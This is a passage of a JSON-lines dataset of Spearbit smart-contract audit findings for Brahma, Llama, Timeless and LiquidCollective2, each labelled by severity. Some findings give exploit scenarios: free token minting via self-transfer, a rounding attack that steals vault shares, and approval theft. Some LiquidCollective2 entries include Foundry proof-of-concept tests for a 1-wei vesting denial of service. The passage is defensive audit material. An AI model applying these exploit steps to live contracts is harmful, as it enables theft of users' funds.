isValidSignature(bytes memory _data, bytes memory _signature) public view override returns ,! (bytes4) { // ... if (_signature.length == 0) { require(safe.signedMessages(messageHash) != 0, \"Hash not approved\"); } else { // ... require(policyValidator.isPolicySignatureValid(msg.sender, messageHash, _signature), \"Policy ,! not approved\"); // ... } // ... }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Function _executeOnSafe() isn't used", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function _executeOnSafe() isn't used in the current code. Note: it is used in some of the tests. function _executeOnSafe(address safe, address target, Enum.Operation op, bytes memory data) internal { bool success = IGnosisSafe(safe).execTransaction(...); if (!success) revert SafeExecTransactionFailed(); }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Unreachable branch in ILlamaCore.actionsCount check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "the in InvalidLlamaCoreAddress(); will never revert with the error InvalidLlamaCoreAddress. ILlamaCore.actionsCount is defined as returning a uint256. LlamaTokenGovernor.initialize The check performed if (_llamaCore.actionsCount() < 0) revert function In cases where _llamaCore refers to an address without an actionsCount function, the call will revert before the < 0 check occurs. In cases where a value less than 0 is returned (i.e. an int256 is returned), the bytes will be interpreted as uint256 and fail to revert. See example in chisel: $ chisel Welcome to Chisel! Type int256 x = -75 x Type: int   !help to show available commands. Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffb5 Decimal: -75 uint256(x) Type: uint Hex: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffb5 Decimal: 115792089237316195423570985008687907853269984665640564039457584007913129639861", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "delayPeriod only works if isFixedLengthApprovalPeriod=true or Governor is the only policyholder", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "The active voting period in Llama is divided into three different periods in the Governor. The first period is the delayPeriod, in this period it is not possible to vote and it can be used to delegate voting power to others by calling the underlying ERC20 token. However, this concept assumes that the active voting period in LlamaCore has always a fixed length. This is defined by the isFixedLengthApprovalPeriod in the strategy. If it is false the action state can be changed to queuing as soon as the needed majority is reached. This can lead to edge cases, where the Governor can't approve or disapprove an action because it is stuck in the delayPeriod and the action has already been executed. If the Governor is the only policyholder for a specific role it does not matter, because a majority by others can not be reached earlier. 4", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "LlamaTokenGovernor only supports one role", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "The role of the LlamaTokenGovernor is defined in the initialize function. In Llama policyhold- ers such as the Governor contract can hold roles, which allows them to create action or participate in voting processes. A policyholder is capable of holding multiple distinct roles. However, if the Governor is assigned more than one role, it becomes impossible to participate in the voting processes associated with the additional roles. In addition, the stored role must be able to create actions and requires the right to approval or forceApproval. Otherwise, the castVote/castVeto function would revert to the strategy.checkIfApprovalEnabled call.", "labels": ["Spearbit", "Llama", "Severity: Low Risk"]}, {"title": "uint16 cannot be less than 0", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "The vote and veto quorum percentage checks compare to 0 with ensuring they are not <= 0.", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Save deploy cost and reduce maintenance overhead by using existing Checkpoint lib", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "PeriodPctCheckpoints and QuorumCheckpoints are drafted to allow for checkpointing of data struc- tures not supported by the original OpenZeppelin Checkpoints lib. There is, however, support for Checkpoint208 as defined below: struct Checkpoint208 { uint48 _key; uint208 _value; }", "labels": ["Spearbit", "Llama", "Severity: Gas Optimization"]}, {"title": "Document strategy compatibility and config requirements", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "Not all strategies and configurations are compatible with the LlamaTokenGovernor.  Some strategies require that creator not be the approver.  Strategy must have a queuing period and approval period.  Interface must have approvalPeriod (not part of the core ILlamaStrategy interface).  Etc...", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Add NatSpec comments for parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "Additional NatSpec comments for parameters would provide more clarity. For example: /// @notice Returns the period pct checkpoints array from a given set of indices. function getPeriodPctCheckpoints(uint256 start, uint256 end) The start parameter here is inclusive and the end parameter is exclusive. This information should be ideally provided in the comments.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Typo in comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "/** ,! - + * @dev Returns whether there is a checkpoint in the structure (i.e. it is not empty), and if so the timestamp and * peiod in the most recent checkpoint. * period in the most recent checkpoint. */", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Adding safety checks for ERC20 voting token in TokenAdapter initialize", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "Not all ERC20 tokens can be used as voting tokens for the Governor contract.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "submissionPeriodPct value is not used in the Governor contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Llama-Spearbit-Dec-Security-Review.pdf", "body": "The submissionPeriodPct can be set with the setPeriodPct together with delayPeriodPct and castingPeriodPct but is not used afterward. In the Governor contract, the active voting period from LlamaCore is divided into three parts. The delay period can be used to delegate voting power, castingPeriod for active voting and the submissionPeriod to submit the voting result.", "labels": ["Spearbit", "Llama", "Severity: Informational"]}, {"title": "Mint PerpetualYieldTokens for free by self-transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The PYT.transfer and transferFrom functions operate on cached balance values. When transfer- ring tokens to oneself the decreased balance is overwritten by an increased balance which makes it possible to mint PYT tokens for free. Consider the following exploit scenario:  Attacker A self-transfers by calling token.transfer(A, token.balanceOf(A)).  balanceOf[msg.sender] is rst set to zero but then overwritten by balanceOf[to] = toBalance + amount, doubling As balance.", "labels": ["Spearbit", "Timeless", "Severity: Critical Risk"]}, {"title": "xPYT auto-compound does not take pounder reward into account", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Conceptually, the xPYT.pound function performs the following steps: 1. Claims yieldAmount yield for itself, deposits the yield back to receive more PYT/NYT (Gate.claimYieldEnter). 2. Buys xPYT with the NYT. 3. Performs a ERC4626.redeem(xPYT) with the bought amount, burning xPYT and receiving pytAmountRedeemed PYT. 4. Performs a ERC4626.deposit(pytAmountRedeemed + yieldAmount = pytCompounded). 5. Pays out a reward in PYT to the caller. The assetBalance is correctly updated for the rst four steps but does not decrease by the pounder reward which is transferred out in the last step. The impact is that the contract has a smaller assets (PYT) balance than what is tracked in assetBalance. 1. Future depositors will have to make up for it as sweep computes the difference between these two values. 2. The xPYT exchange ratio is wrongly updated and withdrawers can redeem xPYT for more assets than they should until the last withdrawer is left holding valueless xPYT. Consider the following example and assume 100% fees for simplicity i.e. pounderReward = pytCompounded.  Vault total: 1k assets, 1k shares total supply.  pound with 100% fee:  claims Y PYT/NYT.  swaps Y NYT to X xPYT.  redeems X xPYT for X PYT by burning X xPYT (supply -= X, exchange ratio is 1-to-1 in example).  assetBalance is increased by claimed Y PYT  pounder receives a pounder reward of X + Y PYT but does not decrease assetBalance by pounder reward X+Y.  Vault totals should be 1k-X assets, 1k-X shares, keeping the same share price.  Nevertheless, vault totals actually are 1k+Y assets, 1k-X shares. Although pounder receives 100% of pound- ing rewards the xPYT price (assets / shares) increased.", "labels": ["Spearbit", "Timeless", "Severity: High Risk"]}, {"title": "Wrong yield accumulation in claimYieldAndEnter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The claimYieldAndEnter function does not accrue yield to the Gate contract itself (this) in case xPYT was specied. The idea is to accrue yield for the mint recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are minted to the Gate before its yield is accrued. Currently, the transfer from this to xPYT through the xPYT.deposit call accrues yield for this after the tokens have been minted to it (userPYTBalance * (updatedYieldPerToken - actualUserYieldPerToken) / PRECI- SION) and its balance increased. This leads to it receiving a larger yield amount than it should have.", "labels": ["Spearbit", "Timeless", "Severity: High Risk"]}, {"title": "Swapper left-over token balances can be stolen", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The Swapper contract may never have any left-over token balances after performing a swap because token balances can be stolen by anyone in several ways:  By using Swapper.doZeroExSwap with useSwapperBalance and tokenOut = tokenToSteal  Arbitrary token approvals to arbitrary spenders can be set on behalf of the Swapper contract using UniswapV3Swapper.swapUnderlyingToXpyt.", "labels": ["Spearbit", "Timeless", "Severity: High Risk"]}, {"title": "TickMath might revert in solidity version 0.8", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "UniswapV3s TickMath library was changed to allow compilations for solidity version 0.8. However, adjustments to account for the implicit overow behavior that the contract relies upon were not performed. The In UniswapV3xPYT.sol is compiled with version 0.8 and indirectly uses this library through the OracleLibrary. the worst case, it could be that the library always reverts (instead of overowing as in previous versions), leading to a broken xPYT contract. The same pragma solidity >=0.5.0; instead of pragma solidity >=0.5.0 <0.8.0; adjustments have been made for the OracleLibrary and PoolAddress contracts. However, their code does not rely on implicit overow behavior.", "labels": ["Spearbit", "Timeless", "Severity: Medium Risk"]}, {"title": "Rounding issues when exiting a vault through shares", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "When exiting a vault through Gate.exitToVaultShares the user species a vaultSharesAmount. The amount of PYT&NYT to burn is determined by a burnAmount = _vaultSharesAmountToUnderlying- this function in derived YearnGate and ERC4626 Amount(vaultSharesAmount) call. All contracts round down the burnAmount. This means one needs to burn fewer amounts than the value of the received vault shares. implementations of This attack can be protable and lead to all vault shares being stolen If the gas costs of this attack are low. This can be the case with vault & underlying tokens with a low number of decimals, highly valuable shares, or cheap gas costs. Consider the following scenario: 7  Imagine the following vault assets: totalAssets = 1.9M, supply = 1M. Therefore, 1 share is theoretically worth 1.9 underlying.  Call enterWithUnderlying(underlyingAmount = 1900) to mint 1900 PYT/NYT (and the gate receives 1900 * supply / totalAssets = 1000 vault shares).  Call exitToVaultShares(vaultSharesAmount = 1), then burnAmount = shares.mulDivDown(totalAssets(), supply) = 1 * totalAssets / supply = 1. This burns 1 \"underlying\" (actually PYT/NYT but they are 1-to-1), but receive 1 vault share (worth 1.9 underlying). Repeat this for up to the minted 1900 PYT/NYT.  Can redeem the 1900 vault shares for 3610 underlying directly at the vault, making a prot of 3610 - 1900 = 1710 underlying.", "labels": ["Spearbit", "Timeless", "Severity: Medium Risk"]}, {"title": "Possible outstanding allowances from Gate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The vault parameter of Gate.enterWithUnderlying can be chosen by an attacker in such a way that underlying = vault.asset() is another vault token of the Gate itself. The subsequent _depositInto- Vault(underlying, underlyingAmount, vault) call will approve underlyingAmount of underlying tokens to the provided vault and could in theory allow stealing from other vault shares. This is currently only exploitable in very rare cases because the caller also has to transfer the underlyingAmount to the gate contract rst. For example, when transferring underlyingAmount = type(uint256).max is possible due to ashloans/ashmints and the vault shares implement approvals in a way that do not decrease anymore if the allowance is type(uint256).max, as is the case with ERC4626 vaults.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Factory.sol owner can change fees unexpectedly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The Factory.sol owner may be able to front run yield calculations in a gate implementation and change user fees unexpectedly.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Low uniswapV3TwapSecondsAgo may result in AMM manipulation in pound()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The lower the value of uniswapV3TwapSecondsAgo is set with at construction creation time the easier It becomes easier for attackers to it becomes for an attacker to manipulate the results of the pound() function. manipulate automated market maker price feeds with a lower time horizon, requiring less capital to manipulate prices, although users may simply not use an xPYT contract that sets uniswapV3TwapSecondsAgo too low.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "UniswapV3Swapper uses wrong allowance check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Before the UniswapV3Swapper can exit a gate, it needs to set an XPYT allowance to the gate. The following check determines if an approval needs to be set: if ( args.xPYT.allowance(address(this), address(args.gate)) < tokenAmountOut ) { args.xPYT.safeApprove(address(args.gate), type(uint256).max); } args.gate.exitToUnderlying( args.recipient, args.vault, args.xPYT, tokenAmountOut ); The tokenAmountOut is in an underlying token amount but A legitimate gate.exitToUnderlying address(swapper)) checks allowance[swapper][gate] >= previewWithdraw(tokenAmountOut). is compared against an xPYT shares amount. xPYT.withdraw(tokenAmountOut, address(gate), call will call", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Missing check that tokenIn and tokenOut are different", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The doZeroExSwap() function takes in two ERC20 addresses which are tokenIn and tokenOut. The problem is that the doZeroExSwap() function does not check if the two token addresses are different from one another. Adding this check can reduce possible attack vectors.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Gate.sol gives unlimitted ERC20 approval on pyt for arbitrary address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "A malicious contract may be passed into the claimYieldAndEnter() function as xPYT and given full control over any PYT the contract may ever hold. Even though PYT is validated to be a real PYT contract and the Gate.sol contract isnt expected to have any PYT in it, it would be safer to remove any unnecessary approvals.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Constructor function does not check for zero address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The constructor function does not check if the addresses passed in are zero addresses. This check can guard against errors during deployment of the contract.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Accruing yield to msg.sender is not required when minting to xPYT contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The _exit function always accrues yield to the msg.sender before burning new tokens. The idea is to accrue yield for the recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are burned on the Gate and not msg.sender.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Unlocked solidity pragmas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Most of the implementation code uses a solidity pragma of 0.8.4. contracts that use different functions. Unlocked solidity pragmas can result in unexpected behaviors or errors with different compiler versions.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "No safeCast in UniswapV3Swappers _swap.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "It should be noted that solidity version 0.8.0 doesnt revert on overow when type-casting. For example, if you tried casting the value 129 from uint8 to int8, it would overow to -127 instead. This is because signed integers have a lower positive integer range compared to unsigned integers i.e -128 to 127 for int8 versus 0 to 255 for uint8.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "One step critical address change", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Setting the owner in Ownable is a one-step transaction. This situation enables the scenario of contract functionality becoming inaccessible or making it so a malicious address that was accidentally set as owner could compromise the system.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Missing zero address checks in transfer and transferFrom functions.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The codebase uses solmates ERC-20 implementation. It should be noted that this library sacrices user safety for gas optimization. As a result, their ERC-20 implementation doesnt include zero address checks on transfer and transferFrom functions.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Should add indexed keyword to deployed xPYT event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The DeployXPYT event only has the ERC20 asset_ marked as indexed while xPYT deployed can also have the indexed key word since you can use up to three per event and it will make it easier for bots to interact off chain with the protocol.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Missing check that tokenAmountIn is larger than zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "In doZeroExSwap() there is no check that the tokenAmountIn number is larger than zero. Adding this check can add more thorough validation within the function.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "ERC20 does not emit Approval event in transferFrom", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The ERC20 contract does not emit new Approval events with the updated allowance in transferFrom. This makes it impossible to track approvals solely by looking at Approval events.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Use the ofcial UniswapV3 0.8 branch", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The current repositories create local copies of UniswapV3s codebase and manually migrate the contracts to Solidity 0.8.  For FullMath.sol this also leads to some small gas optimizations in this LOC as it uses 0 instead of type(uint256).max + 1.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "No checks that provided xPYT matches PYT of the provided vault", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The Gate contracts has many functions that allow specifying vault and a xPYT addresses as pa- rameter. The underlying of the xPYT address is assumed to be the same as the vaults PYT but this check is not enforced. Users that call the Gate functions with an xPYT contract for the wrong vault could see their de- posit/withdrawals lost.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "Protocol does not work with non-standard ERC20 tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Some ERC20 tokens make modications to their ERC20s transfer or balanceOf functions. One kind include deationary tokens that charge certain fee for every transfer or transferFrom. Others are rebasing tokens that increase in balance over time. Using these tokens in the protocol can lead to issues such as:  Entering a vault through the Gate will not work as it tries to deposit the pre-fee amount instead of the received post-fee amount.  The UniswapV3Swapper tries to enter a vault with the pre-fee transfer amount.", "labels": ["Spearbit", "Timeless", "Severity: Informational"]}, {"title": "A malicious user could DOS a vesting schedule by sending only 1 wei of TLC to the vesting escrow address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "An external user who owns some TLC tokens could DOS the vesting schedule of any user by sending just 1 wei of TLC to the escrow address related to the vesting schedule. By doing that:  The creator of the vesting schedule will not be able to revoke the vesting schedule.  The beneficiary of the vesting schedule will not be able to release any vested tokens until the end of the vesting schedule.  Any external contracts or dApps will not be able to call computeVestingReleasableAmount . In practice, all the functions that internally call _computeVestingReleasableAmount will revert because of an un- derflow error when called before the vesting schedule ends. The underflow error leasableAmount will enter uint256 releasedAmount = _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) - balanceOf(_escrow); is thrown because, when called before the schedule ends, _computeVestingRe- try to compute the if (_time < _vestingSchedule.end) branch and will In this case, _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) will always be lower than balanceOf(_escrow) and the contract will revert with an underflow error. When the vesting period ends, the contract will not enter the if (_time < _vestingSchedule.end) and the user will be able to gain the whole vested amount plus the extra amount of TLC sent to the escrow account by the malicious user. Scenario: 1) Bob owns 1 TLC token. 2) Alluvial creates a vesting schedule for Alice like the following example: createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); 3) Bob sends 1 TLC token to the vesting schedule escrow account of the Alice vesting schedule. 8 4) After the cliff period, Alice should be able to release 1 TLC token. Because now balanceOf(_escrow) is 11 it will underflow as _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) returns 10. Find below a test case showing all three different DOS scenarios: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDOSReleaseVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice 9 vm.prank(bob); tlc.transfer(aliceEscrow, 1); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); // The transaction will revert for UNDERFLOW because now the balance of the escrow has been ,! increased externally vm.expectRevert(stdError.arithmeticError); tlc.releaseVestingSchedule(0); // Warp at the vesting schedule period end vm.warp(block.timestamp + 9 days); // Alice is able to get the whole vesting schedule amount // plus the token sent by the attacker to the escrow contract vm.prank(alice); tlc.releaseVestingSchedule(0); assertEq(tlc.balanceOf(alice), 11); } function testDOSRevokeVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); // The creator decide to revoke the vesting schedule before the end timestamp // It will throw an underflow error vm.prank(initAccount); vm.expectRevert(stdError.arithmeticError); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 1)); } function testDOSComputeVestingReleasableAmount() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice 10 vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); vm.expectRevert(stdError.arithmeticError); uint256 releasableAmount = tlc.computeVestingReleasableAmount(0); // Warp to the end of the vesting schedule vm.warp(block.timestamp + 10 days); releasableAmount = tlc.computeVestingReleasableAmount(0); assertEq(releasableAmount, 11); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } 11 }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Critical Risk"]}, {"title": "Coverage funds might be pulled not only for the purpose of covering slashing losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The newly introduced coverage fund is a smart contract that holds ETH to cover a potential lsETH price decrease due to unexpected slashing events. Funds might be pulled from CoverageFundV1 to the River contract through setConsensusLayerData to cover the losses and keep the share price stable In practice, however, it is possible that these funds will be pulled not only in emergency events. _maxIncrease is used as a measure to enforce the maximum difference between prevTotalEth and postTotalEth, but in practice, it is being used as a mandatory growth factor in the context of coverage funds, which might cause the pulling of funds from the coverage fund to ensure _maxIncrease of revenue in case fees are not high enough.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Medium Risk"]}, {"title": "Consider preventing CoverageFundAddress to be set as address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of River.setCoverageFund and CoverageFundAddress.set both func- tion do not revert when the _newCoverageFund address parameter is equal to address(0). If the Coverage Fund address is empty, the River._pullCoverageFunds function will return earlier and will not pull any coverage fund.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Medium Risk"]}, {"title": "CoverageFund.initCoverageFundV1 might be front-runnable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Upgradeable contracts are used in the project, mostly relying on a TUPProxy contract. Initializing a contract is a 2 phase process where the first call is the actual deployment and the second call is a call to the init function itself. From our experience with the repository, the upgradeable contracts deployment scripts are using the TUPProxy correctly, however in that case we were not able to find the deployment script for CoverFund, so we decided to raise this point to make sure you are following the previous policy also for this contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Low Risk"]}, {"title": "Account owner of the minted TLC tokens must call delegate to own vote power of initial minted tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "ken.delegate(accountOwner) to auto-delegate to itself, otherwise it will have zero voting power. the minted TLC tokens must The _account owner of remember to call tlcTo- Without doing that anyone (even with just 1 voting power) could make any proposal pass and in the future manage the DAO proposing, rejecting or accepting/executing proposals. As the OpenZeppelin ERC20 documentation says: By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Low Risk"]}, {"title": "Consider using unchecked block to save some gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Because of the if statement, it is impossible for vestedAmount - releasedAmount to underflow, thus allowing the usage of the unchecked block to save a bit of gas.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Gas Optimization"]}, {"title": "createVestingSchedule allows the creation of a vesting schedule that could release zero tokens after a period has passed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Depending on the value of duration or amount it is possible to create a vesting schedule that would release zero token after a whole period has elapsed. This is an edge case scenario but would still be possible given that createVestingSchedule can be called by anyone and not only Alluvial. See the following test case for an example //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDistributeZeroPerPeriod() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, duration: 365 days, period: 1 days, amount: 100, beneficiary: alice, delegatee: address(0), 15 revocable: true }) ); // One whole period pass and alice check how many tokens she can release vm.warp(block.timestamp + 1 days); uint256 releasable = tlc.computeVestingReleasableAmount(0); assertEq(releasable, 0); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "CoverageFund - Checks-Effects-Interactions best practice is violated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "We were not able to find any concrete instances of harmful reentrancy attack vectors in this contract, but it's recommended to follow the Checks-effects-interactions pattern anyway.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "River contract allows setting an empty metadata URI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of 